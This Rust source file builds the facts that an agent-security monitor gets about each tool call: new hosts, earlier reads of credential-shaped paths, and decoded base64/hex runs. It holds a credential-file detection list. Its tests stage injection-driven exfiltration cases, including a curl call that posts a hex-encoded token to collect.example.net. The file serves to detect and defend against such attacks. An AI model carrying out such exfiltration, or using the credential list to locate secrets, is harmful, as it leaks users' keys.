//! `security.v2`: `security.v1`'s state, plus facts the builder computes
//! because Jev cannot: whether the call's host is one the operator named,
//! the page's host, or new to the session; whether a credential-shaped path
//! was touched earlier; what an encoded run in the call decodes to; and how
//! much text the call sends out. It also shows what the session read lately
//! (an excerpt), because "the page drove the call" cannot be judged without
//! the page.
//!
//! A fact that does not apply is left out, not stated false: no URL, no host
//! facts; no provenance from the core, no `call_uses_tainted_path`. A
//! missing fact means "not known here".
//!
//! Secrets: an encoded run that decodes to something the scrubber changes is
//! replaced, wherever it appears in the state, by a marker (see
//! [`DecodingScrub`]). The decoded text shown in a fact passes the scrubber
//! too, so a value that is secret never enters the state in either form.
//!
//! Work is bounded: at most [`MAX_LEAVES`] strings of at most [`LEAF_CHARS`]
//! chars are read from the earlier calls, and at most [`MAX_RUNS`] encoded
//! runs are decoded from the call.

use super::*;

const MAX_LEAVES: usize = 400;
const LEAF_CHARS: usize = 512;
const SCAN_CHARS: usize = 16 * 1024;
const MAX_RUNS: usize = 20;
const SHOWN_RUNS: usize = 5;
const SHOWN_CREDENTIAL_PATHS: usize = 4;
const RECENT_READS: usize = 3;
/// Earlier calls read for facts (the newest that ran), and the call's own
/// argv items and paths looked at: the state shows fewer, so the facts do not
/// reach further than the state does by much.
const EARLIER_CALLS: usize = 100;
const READ_EXCERPT_CHARS: usize = 400;
const DECODED_CHARS: usize = 120;
/// The shortest run worth decoding: base64 that decodes to text, and hex.
const MIN_TEXT_RUN: usize = 16;
const MIN_HEX_RUN: usize = 32;
/// A run that does not decode to text is reported only past this length.
const MIN_BINARY_RUN: usize = 40;

/// Two-label suffixes that are not a name an operator would give: naming
/// `co.uk` names no host.
const SHARED_SUFFIXES: &[&str] = &[
    "co.uk", "org.uk", "ac.uk", "gov.uk", "com.au", "co.jp", "co.nz", "com.br", "co.in", "co.za",
];

/// `security.v2`'s shares of the cap: narrower than v1's, to make room for
/// `recent_reads`.
const SHARES: SecurityShares = SecurityShares {
    argv: 14,
    paths: 8,
    other_args: 10,
    ask: 14,
    last_calls: 14,
};

pub fn security2(i: &SecurityInput, cap: u64, scrub: &dyn Scrub) -> Prepared {
    let scrub = DecodingScrub { inner: scrub };
    let c = Clipper::new(&scrub);
    let mut b = StateBuilder::new("security2", SECURITY2_VERSION, cap, &scrub);
    security_fields(&mut b, &c, i, cap, &SHARES);
    let reads: Vec<Value> = newest(&i.recent_reads, RECENT_READS)
        .iter()
        .map(|r| {
            json!({
                "source": c.clip(&r.source, 200),
                "excerpt": c.clip(&r.excerpt, READ_EXCERPT_CHARS),
            })
        })
        .collect();
    if !reads.is_empty() {
        b.list_after(
            "text_the_session_read",
            6,
            share(cap, 14),
            reads,
            left_out(&i.recent_reads, RECENT_READS),
        )
        .cut_if("text_the_session_read", c.cut());
    }
    let (facts, runs) = facts(i, &scrub);
    b.scalar("facts", facts);
    if runs.as_array().is_some_and(|r| !r.is_empty()) {
        b.scalar("encoded_runs", runs);
    }
    Prepared {
        state: Arc::new(b.build()),
        dynamic: Dynamic::default(),
    }
}

// ------------------------------------------------------------------ facts

/// Whether the call's host is one the operator named, the external text's
/// own, seen earlier in the session, or new.
fn host_facts(
    f: &mut serde_json::Map<String, Value>,
    i: &SecurityInput,
    h: &String,
    ask: &str,
    earlier: &[&ToolCallInput],
) {
    let named = domain_tokens(ask).iter().any(|t| names_host(t, h));
    let page = i
        .hold
        .as_ref()
        .and_then(|x| x.host.as_deref())
        .map(host_key);
    let is_page = page.as_deref() == Some(h.as_str());
    let seen = earlier_hosts(earlier).iter().any(|x| x == h);
    f.insert("host_named_in_operator_ask".into(), named.into());
    if i.hold.is_some() {
        f.insert("host_is_external_text_host".into(), is_page.into());
    }
    f.insert("host_seen_earlier_in_session".into(), seen.into());
    f.insert(
        "call_goes_to_new_host".into(),
        (!named && !is_page && !seen).into(),
    );
}

fn facts(i: &SecurityInput, scrub: &dyn Scrub) -> (Value, Value) {
    let mut f = serde_json::Map::new();
    let parsed = i
        .url
        .as_deref()
        .filter(|u| u.len() <= 8192)
        .and_then(|u| reqwest::Url::parse(u).ok());
    let host = parsed
        .as_ref()
        .and_then(|u| u.host_str())
        .map(host_key)
        .filter(|h| !h.is_empty());
    let ask = i.operator_last_ask.as_deref().unwrap_or("");
    let earlier = earlier_calls(&i.last_calls);

    if let Some(h) = &host {
        host_facts(&mut f, i, h, ask, &earlier);
    }
    if let Some(u) = &parsed {
        let q = pct_decode(u.query().unwrap_or(""));
        f.insert("url_query_chars".into(), q.chars().count().into());
    }

    // The call's own strings: argv, paths, the URL (decoded), other args.
    let argv = &i.argv[..i.argv.len().min(SECURITY_ARGV)];
    let mut own: Vec<String> = argv
        .iter()
        .chain(i.paths.iter().take(SECURITY_PATHS))
        .map(|s| clip_chars(s, LEAF_CHARS))
        .collect();
    if let Some(u) = &parsed {
        own.push(pct_decode(u.path()));
        own.push(pct_decode(u.query().unwrap_or("")));
    } else if let Some(u) = &i.url {
        own.push(clip_chars(u, LEAF_CHARS));
    }
    if let Some(o) = &i.other_args {
        let mut l = Vec::new();
        leaves(o, &mut l);
        own.extend(l.into_iter().map(str::to_string));
    }
    f.insert(
        "call_names_credential_path".into(),
        own.iter().any(|s| credential_token(s).is_some()).into(),
    );
    f.insert(
        "operator_ask_names_credential_path".into(),
        credential_token(ask).is_some().into(),
    );
    let mut touched: Vec<String> = Vec::new();
    for c in &earlier {
        let mut l = Vec::new();
        leaves(&c.args, &mut l);
        for s in l {
            if let Some(t) = credential_token(s) {
                if !touched.contains(&t) {
                    touched.push(t);
                }
            }
        }
    }
    f.insert(
        "credential_path_touched_earlier".into(),
        (!touched.is_empty()).into(),
    );
    if !touched.is_empty() {
        let shown: Vec<String> = touched
            .iter()
            .take(SHOWN_CREDENTIAL_PATHS)
            .map(|t| clip_chars(&scrub.scrub(t), 80))
            .collect();
        f.insert("credential_paths_touched_earlier".into(), json!(shown));
    }
    if !i.tainted_paths.is_empty() {
        let tainted = |s: &str| i.tainted_paths.iter().any(|t| same_path(s, t));
        f.insert(
            "call_uses_tainted_path".into(),
            own.iter().any(|s| tainted(s)).into(),
        );
        let mut read = false;
        for c in &earlier {
            let mut l = Vec::new();
            leaves(&c.args, &mut l);
            read |= l.into_iter().any(tainted);
        }
        f.insert("tainted_path_read_earlier".into(), read.into());
    }

    let found = encoded_runs(i, parsed.as_ref(), scrub);
    f.insert("encoded_run_count".into(), found.len().into());
    let shown: Vec<Value> = found.iter().take(SHOWN_RUNS).map(Found::json).collect();
    (Value::Object(f), Value::Array(shown))
}

/// The encoded runs in the call's own places: the query by parameter, the
/// path, argv, and the other arguments.
fn encoded_runs(i: &SecurityInput, parsed: Option<&reqwest::Url>, scrub: &dyn Scrub) -> Vec<Found> {
    let argv = &i.argv[..i.argv.len().min(SECURITY_ARGV)];
    let mut found: Vec<Found> = Vec::new();
    if let Some(u) = parsed {
        for piece in u.query().unwrap_or("").split('&') {
            let (name, value) = piece.split_once('=').unwrap_or((piece, ""));
            let place = format!("url_query:{}", clip_chars(&pct_decode(name), 24));
            scan(&place, &pct_decode(value), scrub, &mut found);
        }
        scan("url_path", &pct_decode(u.path()), scrub, &mut found);
    }
    for (n, a) in argv.iter().enumerate() {
        scan(&format!("argv[{n}]"), a, scrub, &mut found);
    }
    if let Some(o) = &i.other_args {
        let mut l = Vec::new();
        leaves(o, &mut l);
        for s in l {
            scan("other_args", s, scrub, &mut found);
        }
    }
    found
}

/// Earlier calls that ran (a call that failed or waits read nothing).
fn earlier_calls(calls: &[ToolCallInput]) -> Vec<&ToolCallInput> {
    let mut ran: Vec<&ToolCallInput> = calls
        .iter()
        .rev()
        .filter(|c| c.outcome == CallOutcome::Ok)
        .take(EARLIER_CALLS)
        .collect();
    ran.reverse();
    ran
}

fn earlier_hosts(calls: &[&ToolCallInput]) -> Vec<String> {
    let mut out = Vec::new();
    for c in calls {
        let mut l = Vec::new();
        leaves(&c.args, &mut l);
        for s in l {
            if s.starts_with("http://") || s.starts_with("https://") {
                if let Some(h) = reqwest::Url::parse(s)
                    .ok()
                    .and_then(|u| u.host_str().map(host_key))
                {
                    out.push(h);
                }
            }
        }
    }
    out
}

/// A host as compared: lowercase, no trailing dot, no leading `www.`.
fn host_key(h: &str) -> String {
    let h = h.trim_end_matches('.').to_lowercase();
    h.strip_prefix("www.").unwrap_or(&h).to_string()
}

/// The dotted words of a text, lowercase: the hosts and domains it names.
fn domain_tokens(text: &str) -> Vec<String> {
    clip_chars(text, SCAN_CHARS)
        .to_lowercase()
        .split(|c: char| !(c.is_alphanumeric() || c == '.' || c == '-'))
        .map(|t| t.trim_matches(|c| c == '.' || c == '-'))
        .filter(|t| t.contains('.') && !t.contains(".."))
        .map(host_key)
        .collect()
}

/// A named domain covers itself and its subdomains, never a shared suffix.
fn names_host(token: &str, host: &str) -> bool {
    if token == host {
        return true;
    }
    !SHARED_SUFFIXES.contains(&token)
        && token.matches('.').count() >= 1
        && host.ends_with(&format!(".{token}"))
}

/// `%XX` escapes decoded; a `+` stays a `+` (it is base64's before it is a
/// form's space), and a bad escape stays as written.
fn pct_decode(s: &str) -> String {
    let b = s.as_bytes();
    let mut out = Vec::with_capacity(b.len());
    let mut i = 0;
    while i < b.len() {
        let hex = |x: u8| char::from(x).to_digit(16);
        if b[i] == b'%' && b.len() >= i + 3 {
            if let (Some(h), Some(l)) = (hex(b[i + 1]), hex(b[i + 2])) {
                out.push((h * 16 + l) as u8);
                i += 3;
                continue;
            }
        }
        out.push(b[i]);
        i += 1;
    }
    String::from_utf8_lossy(&out).into_owned()
}

/// The first `n` chars of `s`.
fn clip_chars(s: &str, n: usize) -> String {
    s.chars().take(n).collect()
}

/// Every string in a value, bounded in number and length.
fn leaves<'a>(v: &'a Value, out: &mut Vec<&'a str>) {
    if out.len() >= MAX_LEAVES {
        return;
    }
    match v {
        Value::String(s) => {
            let mut end = s.len().min(LEAF_CHARS * 4);
            while !s.is_char_boundary(end) {
                end -= 1;
            }
            out.push(&s[..end]);
        }
        Value::Array(a) => a.iter().for_each(|x| leaves(x, out)),
        Value::Object(m) => m.values().for_each(|x| leaves(x, out)),
        _ => {}
    }
}

fn same_path(a: &str, b: &str) -> bool {
    let norm = |s: &str| s.trim().trim_start_matches("./").to_string();
    let (a, b) = (norm(a), norm(b));
    !a.is_empty()
        && !b.is_empty()
        && (a == b || a.ends_with(&format!("/{b}")) || b.ends_with(&format!("/{a}")))
}

// ------------------------------------------------------------ credentials

const SECRET_DIRS: &[&str] = &[
    ".aws", ".ssh", ".gnupg", ".kube", ".azure", "secrets", ".secrets",
];
const SECRET_FILES: &[&str] = &[
    ".env",
    ".envrc",
    ".netrc",
    ".npmrc",
    ".pypirc",
    ".pgpass",
    ".htpasswd",
    ".git-credentials",
    "credentials",
    "credentials.json",
    "secrets.json",
    "secrets.yaml",
    "secrets.yml",
    "secrets.toml",
    "service-account.json",
    "kubeconfig",
    "id_rsa",
    "id_dsa",
    "id_ecdsa",
    "id_ed25519",
];
const SECRET_EXTENSIONS: &[&str] = &["pem", "key", "p12", "pfx", "jks", "keystore"];
/// `.env.example` and its kin hold no secret.
const TEMPLATE_SUFFIXES: &[&str] = &["example", "sample", "template", "dist", "defaults"];

/// The first credential-shaped path or reference in a text, as written.
fn credential_token(text: &str) -> Option<String> {
    clip_chars(text, SCAN_CHARS)
        .split(|c: char| c.is_whitespace() || "\"'`=,;()<>|&:".contains(c))
        .find(|t| credential_shaped(t))
        .map(|t| clip_chars(t, 80))
}

fn credential_shaped(token: &str) -> bool {
    let t = token.to_lowercase();
    if t.starts_with("op://") {
        return true;
    }
    let parts: Vec<&str> = t.split(['/', '\\']).filter(|p| !p.is_empty()).collect();
    let Some(base) = parts.last() else {
        return false;
    };
    if parts.len() > 1
        && parts[..parts.len() - 1]
            .iter()
            .any(|p| SECRET_DIRS.contains(p))
    {
        return true;
    }
    if SECRET_DIRS.contains(base) || SECRET_FILES.contains(base) {
        return true;
    }
    if let Some(rest) = base.strip_prefix(".env.") {
        return !TEMPLATE_SUFFIXES.contains(&rest);
    }
    base.rsplit_once('.')
        .is_some_and(|(stem, ext)| !stem.is_empty() && SECRET_EXTENSIONS.contains(&ext))
}

// ----------------------------------------------------------- encoded runs

/// An encoded run found in a text.
struct Found {
    place: String,
    kind: &'static str,
    chars: usize,
    /// What it decodes to, when that is text: scrubbed, clipped.
    text: Option<String>,
    credential_words: bool,
    held_back: bool,
}

impl Found {
    fn json(&self) -> Value {
        let mut v = json!({
            "in": self.place,
            "encoding": self.kind,
            "chars": self.chars,
            "decodes_to": if self.text.is_some() { "text" } else { "not text" },
            "decoded_looks_like_a_credential": self.credential_words,
        });
        if let Some(t) = &self.text {
            v["decoded"] = json!(t);
        }
        if self.held_back {
            v["secret_held_back"] = json!(true);
        }
        v
    }
}

/// A run in a text: its byte range, its encoding, and what it decodes to.
struct Span {
    start: usize,
    end: usize,
    kind: &'static str,
    text: Option<String>,
}

fn alphabet(b: u8) -> bool {
    b.is_ascii_alphanumeric() || matches!(b, b'+' | b'/' | b'-' | b'_')
}

fn b64_val(b: u8) -> Option<u32> {
    Some(match b {
        b'A'..=b'Z' => u32::from(b - b'A'),
        b'a'..=b'z' => u32::from(b - b'a') + 26,
        b'0'..=b'9' => u32::from(b - b'0') + 52,
        b'+' | b'-' => 62,
        b'/' | b'_' => 63,
        _ => return None,
    })
}

/// Base64, standard or URL-safe, padding optional.
fn b64_decode(run: &[u8]) -> Option<Vec<u8>> {
    if run.len() % 4 == 1 {
        return None;
    }
    let mut out = Vec::with_capacity(run.len() * 3 / 4);
    let (mut acc, mut bits) = (0u32, 0u32);
    for &b in run {
        acc = (acc << 6) | b64_val(b)?;
        bits += 6;
        if bits >= 8 {
            bits -= 8;
            out.push((acc >> bits) as u8);
            acc &= (1 << bits) - 1;
        }
    }
    Some(out)
}

/// Text that is mostly printable, at least a few bytes.
fn as_text(bytes: &[u8]) -> Option<String> {
    let s = std::str::from_utf8(bytes).ok()?;
    let printable = s
        .chars()
        .filter(|c| !c.is_control() || matches!(c, '\n' | '\r' | '\t'))
        .count();
    (s.chars().count() >= 6 && printable * 10 >= s.chars().count() * 9).then(|| s.to_string())
}

/// The encoded runs in `text`: hex of 32 chars or more, and base64 of 16 or
/// more that decodes to text, or of 40 or more that holds a digit and
/// neither `/`, `-`, nor `_` (the marks of a path or a slug) whatever it
/// decodes to. A slug, a path, or a word does not decode to text, so it is
/// passed.
fn spans(text: &str) -> Vec<Span> {
    let text = &text[..text
        .char_indices()
        .nth(SCAN_CHARS)
        .map_or(text.len(), |(i, _)| i)];
    let b = text.as_bytes();
    let mut out: Vec<Span> = Vec::new();
    // Hex first, over runs of hex digits alone, so a commit id in a path is
    // found whole.
    let mut i = 0;
    while i < b.len() && out.len() < MAX_RUNS {
        if !b[i].is_ascii_hexdigit() {
            i += 1;
            continue;
        }
        let start = i;
        while i < b.len() && b[i].is_ascii_hexdigit() {
            i += 1;
        }
        if i - start >= MIN_HEX_RUN && (i - start) % 2 == 0 {
            if let Ok(bytes) = hex::decode(&b[start..i]) {
                let text = as_text(&bytes);
                out.push(Span {
                    start,
                    end: i,
                    kind: "hex",
                    text,
                });
            }
        }
    }
    let hexes = out.len();
    i = 0;
    while i < b.len() && out.len() < MAX_RUNS {
        if !alphabet(b[i]) {
            i += 1;
            continue;
        }
        let start = i;
        while i < b.len() && alphabet(b[i]) {
            i += 1;
        }
        let run = &b[start..i];
        let mut end = i;
        while end < b.len() && end - i < 2 && b[end] == b'=' {
            end += 1;
        }
        if run.len() < MIN_TEXT_RUN || out[..hexes].iter().any(|h| h.start >= start && h.end <= i) {
            continue;
        }
        let Some(bytes) = b64_decode(run) else {
            continue;
        };
        let text = as_text(&bytes);
        let classes = [
            run.iter().any(u8::is_ascii_uppercase),
            run.iter().any(u8::is_ascii_lowercase),
            run.iter().any(u8::is_ascii_digit),
        ]
        .iter()
        .filter(|x| **x)
        .count();
        let plain = !run.iter().any(|c| matches!(c, b'/' | b'-' | b'_'));
        let wide = run.len() >= MIN_BINARY_RUN
            && plain
            && classes >= 2
            && run.iter().any(u8::is_ascii_digit);
        if (text.is_some() && classes >= 2) || wide {
            out.push(Span {
                start,
                end,
                kind: "base64",
                text,
            });
            i = end;
        }
    }
    out.sort_by_key(|s| s.start);
    out
}

fn credential_words(text: &str) -> bool {
    let t = text.to_lowercase();
    const WORDS: &[&str] = &[
        "secret",
        "password",
        "passwd",
        "token",
        "api_key",
        "apikey",
        "private key",
        "aws_",
        "bearer ",
        "authorization",
        "credential",
    ];
    if WORDS.iter().any(|w| t.contains(w)) {
        return true;
    }
    let b = text.as_bytes();
    b.windows(20).any(|w| {
        (w.starts_with(b"AKIA") || w.starts_with(b"ASIA"))
            && w[4..]
                .iter()
                .all(|c| c.is_ascii_uppercase() || c.is_ascii_digit())
    })
}

fn scan(place: &str, text: &str, scrub: &dyn Scrub, out: &mut Vec<Found>) {
    for s in spans(text) {
        if out.len() >= MAX_RUNS {
            return;
        }
        let shown = s.text.as_deref().map(|t| scrub.scrub(t));
        out.push(Found {
            place: place.to_string(),
            kind: s.kind,
            chars: s.end - s.start,
            credential_words: s.text.as_deref().is_some_and(credential_words),
            held_back: s
                .text
                .as_deref()
                .zip(shown.as_deref())
                .is_some_and(|(a, b)| a != b),
            text: shown.map(|t| clip_chars(&t, DECODED_CHARS)),
        });
    }
}

/// The caller's scrubber, and a second pass: an encoded run whose decoded
/// text the scrubber would change is replaced by a marker, so a secret that
/// travels as base64 or hex cannot reach Jev encoded when it could not
/// reach Jev plain.
struct DecodingScrub<'a> {
    inner: &'a dyn Scrub,
}

impl Scrub for DecodingScrub<'_> {
    fn scrub(&self, text: &str) -> String {
        let plain = self.inner.scrub(text);
        let mut out = String::with_capacity(plain.len());
        let mut at = 0;
        for s in spans(&plain) {
            let secret = s.text.as_deref().is_some_and(|t| self.inner.scrub(t) != t);
            if secret && s.start >= at {
                out.push_str(&plain[at..s.start]);
                out.push_str(&format!(
                    "[held back: encoded secret, {} chars]",
                    s.end - s.start
                ));
                at = s.end;
            }
        }
        out.push_str(&plain[at..]);
        out
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::eval;
    use crate::pack::by_name;
    use crate::state::NoScrub;
    use crate::tests::golden;

    fn state_of(i: &SecurityInput, scrub: &dyn Scrub) -> Value {
        let p = by_name("security.v2").unwrap();
        prepare(&p, &Input::Security2(i.clone()), scrub)
            .unwrap()
            .state
            .value()
    }

    fn case(name: &str) -> SecurityInput {
        eval::set("security.v2")
            .unwrap()
            .into_iter()
            .find(|c| c.name == name)
            .unwrap_or_else(|| panic!("no case {name}"))
            .input
    }

    fn facts_of(name: &str) -> Value {
        state_of(&case(name), &NoScrub)["facts"].clone()
    }

    /// Every case's state, as Jev receives it: the golden that a dropped
    /// fact breaks.
    #[test]
    fn every_eval_case_builds_its_golden_state() {
        let mut all = serde_json::Map::new();
        for c in eval::set("security.v2").unwrap() {
            all.insert(c.name.clone(), state_of(&c.input, &NoScrub));
        }
        golden(
            "fixtures/golden/security.v2.eval.states.json",
            &serde_json::to_string_pretty(&Value::Object(all)).unwrap(),
        );
    }

    #[test]
    fn host_facts_tell_a_new_host_from_the_asked_and_the_page() {
        let f = facts_of("exfil_steered_by_page");
        assert_eq!(f["host_named_in_operator_ask"], false);
        assert_eq!(f["host_is_external_text_host"], false);
        assert_eq!(f["host_seen_earlier_in_session"], false);
        assert_eq!(f["call_goes_to_new_host"], true);
        let f = facts_of("benign_fetch_of_asked_host");
        assert_eq!(f["host_named_in_operator_ask"], true, "a URL in the ask");
        assert_eq!(f["host_is_external_text_host"], true);
        assert_eq!(f["host_seen_earlier_in_session"], true);
        assert_eq!(f["call_goes_to_new_host"], false);
        // A subdomain of a domain the operator named is named; a bare
        // domain in prose counts.
        let f = facts_of("benign_subdomain_of_named_docs");
        assert_eq!(f["host_named_in_operator_ask"], true);
        assert_eq!(f["host_is_external_text_host"], false);
        assert_eq!(f["call_goes_to_new_host"], false);
        // No URL, no host facts, no claim about hosts.
        let f = facts_of("benign_run_tests");
        assert!(f.get("call_goes_to_new_host").is_none());
        assert!(f.get("host_is_external_text_host").is_none());
    }

    #[test]
    fn a_shared_suffix_names_no_host() {
        let mut i = case("exfil_steered_by_page");
        i.operator_last_ask = Some("Compare the pricing pages of the two co.uk shops.".into());
        i.url = Some("https://evil.co.uk/x".into());
        assert_eq!(
            state_of(&i, &NoScrub)["facts"]["host_named_in_operator_ask"],
            false
        );
        i.operator_last_ask = Some("Summarize https://evil.co.uk/ for me.".into());
        assert_eq!(
            state_of(&i, &NoScrub)["facts"]["host_named_in_operator_ask"],
            true
        );
        // A host that merely ends in a named name is not a subdomain of it.
        i.operator_last_ask = Some("Summarize example.org for me.".into());
        i.url = Some("https://notexample.org/x".into());
        assert_eq!(
            state_of(&i, &NoScrub)["facts"]["host_named_in_operator_ask"],
            false
        );
    }

    #[test]
    fn credential_facts_see_earlier_touches_and_the_asks_own() {
        let f = facts_of("exfil_new_host_page_text_cut");
        assert_eq!(f["credential_path_touched_earlier"], true);
        assert_eq!(f["credential_paths_touched_earlier"], json!([".env"]));
        let f = facts_of("hex_exfil_by_curl");
        assert_eq!(
            f["credential_paths_touched_earlier"],
            json!(["/home/dev/.aws/credentials"])
        );
        let f = facts_of("benign_env_read_asked");
        assert_eq!(f["call_names_credential_path"], true);
        assert_eq!(f["operator_ask_names_credential_path"], true);
        assert_eq!(f["credential_path_touched_earlier"], false);
        // A template is not a credential file.
        let f = facts_of("benign_env_example_template");
        assert_eq!(f["call_names_credential_path"], false);
        assert_eq!(f["credential_path_touched_earlier"], false);
        // A call that failed read nothing.
        let mut i = case("exfil_new_host_page_text_cut");
        for c in &mut i.last_calls {
            c.outcome = CallOutcome::Error;
        }
        assert_eq!(
            state_of(&i, &NoScrub)["facts"]["credential_path_touched_earlier"],
            false
        );
    }

    #[test]
    fn what_is_credential_shaped_is_a_short_list() {
        for yes in [
            ".env",
            "./app/.env.production",
            "~/.aws/config",
            "/root/.ssh/id_ed25519",
            "certs/server.pem",
            "keys/deploy.key",
            "C:\\Users\\dev\\.ssh\\known_hosts",
            "config/secrets/db.yaml",
            "op://Private/db/password",
            "~/.netrc",
        ] {
            assert!(credential_shaped(yes), "{yes}");
        }
        for no in [
            ".env.example",
            ".env.sample",
            "src/environment.rs",
            "id_rsa.pub",
            "docs/keys.md",
            "monkey.rs",
            "src/secret_sauce.rs",
        ] {
            assert!(!credential_shaped(no), "{no}");
        }
    }

    #[test]
    fn provenance_is_stated_only_when_the_core_has_it() {
        let f = facts_of("laundered_file_with_provenance");
        assert_eq!(f["tainted_path_read_earlier"], true);
        assert_eq!(f["call_uses_tainted_path"], false);
        let f = facts_of("laundered_file_no_provenance");
        assert!(f.get("tainted_path_read_earlier").is_none());
        assert!(f.get("call_uses_tainted_path").is_none());
        let mut i = case("laundered_file_with_provenance");
        i.paths = vec!["./notes/todo.md".into()];
        assert_eq!(
            state_of(&i, &NoScrub)["facts"]["call_uses_tainted_path"],
            true
        );
    }

    #[test]
    fn encoded_runs_decode_to_what_they_say() {
        let s = state_of(&case("exfil_steered_by_page"), &NoScrub);
        let r = &s["encoded_runs"][0];
        assert_eq!(r["in"], "url_query:data");
        assert_eq!(r["encoding"], "base64");
        assert_eq!(r["decoded"], "AWS_SECRET_ACCESS_KEY=sample");
        assert_eq!(r["decoded_looks_like_a_credential"], true);
        assert_eq!(s["facts"]["encoded_run_count"], 1);
        let s = state_of(&case("hex_exfil_by_curl"), &NoScrub);
        let r = &s["encoded_runs"][0];
        assert_eq!(r["in"], "argv[6]");
        assert_eq!(r["encoding"], "hex");
        assert_eq!(r["decoded"], "DB_PASSWORD=sample-hunter2");
        // Benign encoded text decodes, and is not a credential.
        let s = state_of(&case("benign_encoded_text_asked"), &NoScrub);
        let r = &s["encoded_runs"][0];
        assert_eq!(r["decoded"], "Hello, world! This is a test.");
        assert_eq!(r["decoded_looks_like_a_credential"], false);
    }

    #[test]
    fn slugs_hashes_and_words_are_not_encoded_runs() {
        let mut i = case("benign_fetch_of_asked_host");
        for url in [
            "https://docs.example.org/getting-started-with-the-widget-library-guide",
            "https://docs.example.org/Setup-Instructions-For-Linux-Servers",
            "https://docs.example.org/internationalization/Internationalization",
            "https://docs.example.org/a/short?id=12345",
        ] {
            i.url = Some(url.into());
            assert_eq!(
                state_of(&i, &NoScrub)["facts"]["encoded_run_count"],
                0,
                "{url}"
            );
        }
        // A 40-character commit id is a hex run that decodes to no text:
        // it is reported as not text, and not as a credential.
        i.url =
            Some("https://docs.example.org/commit/9f2b8c1d7e4a6035b1c8d9e0f1a2b3c4d5e6f708".into());
        let s = state_of(&i, &NoScrub);
        assert_eq!(s["encoded_runs"][0]["encoding"], "hex");
        assert_eq!(s["encoded_runs"][0]["decodes_to"], "not text");
        assert_eq!(
            s["encoded_runs"][0]["decoded_looks_like_a_credential"],
            false
        );
    }

    struct Redact(&'static str);

    impl Scrub for Redact {
        fn scrub(&self, text: &str) -> String {
            text.replace(self.0, "[scrubbed]")
        }
    }

    /// A secret's value never enters the state: not plain, not decoded, and
    /// not as the encoded run that carries it, in the query, an argv item,
    /// or an argument.
    #[test]
    fn a_secret_never_enters_the_state_plain_or_encoded() {
        let secret = "sk-live-abc123def456ghi789";
        let line = format!("TOKEN={secret}");
        let b64 = base64_of(line.as_bytes());
        let hex = hex::encode(line.as_bytes());
        let mut i = case("exfil_steered_by_page");
        i.url = Some(format!("https://collect.example.net/in?data={b64}"));
        i.argv = vec!["curl".into(), "-d".into(), hex.clone()];
        i.other_args = Some(json!({"body": b64}));
        i.last_calls[0].args = json!({"url": format!("https://collect.example.net/in?data={b64}")});
        let plain = state_of(&i, &NoScrub).to_string();
        assert!(plain.contains(&b64) && plain.contains(&hex), "the control");
        let held = state_of(&i, &Redact(secret));
        let text = held.to_string();
        for leak in [secret, b64.as_str(), hex.as_str()] {
            assert!(!text.contains(leak), "{leak} leaked: {text}");
        }
        assert!(text.contains("held back: encoded secret"), "{text}");
        let runs = held["encoded_runs"].as_array().unwrap();
        assert!(
            runs.iter().all(|r| r["secret_held_back"] == true),
            "{runs:?}"
        );
        assert!(runs[0]["decoded"].as_str().unwrap().contains("[scrubbed]"));
    }

    fn base64_of(bytes: &[u8]) -> String {
        const A: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        let mut out = String::new();
        for ch in bytes.chunks(3) {
            let n = ch
                .iter()
                .enumerate()
                .fold(0u32, |a, (i, b)| a | u32::from(*b) << (16 - 8 * i));
            for k in 0..=ch.len() {
                out.push(A[(n >> (18 - 6 * k) & 63) as usize] as char);
            }
            for _ in ch.len()..3 {
                out.push('=');
            }
        }
        out
    }

    #[test]
    fn the_base64_helper_and_decoder_agree() {
        for s in ["", "a", "ab", "abc", "abcd", "AWS_SECRET_ACCESS_KEY=sample"] {
            let e = base64_of(s.as_bytes());
            let run = e.trim_end_matches('=');
            assert_eq!(b64_decode(run.as_bytes()).unwrap(), s.as_bytes(), "{s}");
        }
    }

    /// The builder sits on the gate's path, after the decision: each case
    /// builds in well under a millisecond in a release build, and the debug
    /// bound here is a loose guard against work that grows with the input.
    #[test]
    fn the_builder_is_fast() {
        let cases = eval::set("security.v2").unwrap();
        let p = by_name("security.v2").unwrap();
        let start = std::time::Instant::now();
        let rounds = 200;
        for _ in 0..rounds {
            for c in &cases {
                let _ = prepare(&p, &Input::Security2(c.input.clone()), &NoScrub).unwrap();
            }
        }
        let per = start.elapsed() / (rounds * cases.len()) as u32;
        eprintln!(
            "security.v2 builder: {per:?} per call over {} cases",
            cases.len()
        );
        assert!(per < std::time::Duration::from_millis(5), "{per:?}");
    }
}
